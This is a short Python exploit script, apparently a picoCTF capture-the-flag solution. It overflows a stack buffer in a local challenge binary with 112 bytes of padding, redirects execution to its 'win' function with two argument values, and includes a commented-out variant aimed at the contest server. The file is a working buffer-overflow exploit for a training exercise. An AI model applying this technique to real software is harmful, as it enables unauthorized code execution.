#!/usr/bin/python3

from pwn import *

offset = 112

e = ELF('./vuln')

payload = b'A' * offset
payload += p32(e.symbols['win'])
payload += p32(0x0)
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)

p = process('./vuln')
p.sendline(payload)
p.interactive()
'''
r = remote("saturn.picoctf.net", 62620)
r.recvline()
r.sendline(payload)
r.interactive()
'''
